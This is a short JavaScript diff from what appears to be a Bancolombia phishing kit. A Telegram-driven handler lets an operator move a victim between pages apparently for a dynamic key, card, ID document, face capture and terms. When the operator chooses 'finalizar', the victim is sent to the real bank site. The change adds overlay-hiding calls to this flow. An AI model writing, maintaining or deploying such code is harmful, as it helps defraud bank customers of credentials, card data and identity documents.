@@ -151,8 +151,10 @@ document.addEventListener('DOMContentLoaded', async function() {
     
     BancoUtils.onTelegramAction((data) => {
         if (data.action === 'finalizar') {
+            BancoUtils.hideOverlay();
             window.location.href = 'https://www.bancolombia.com/personas';
         } else if (['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'].includes(data.action)) {
+            BancoUtils.hideOverlay();
             window.location.href = data.action + '.html';
         }
     });
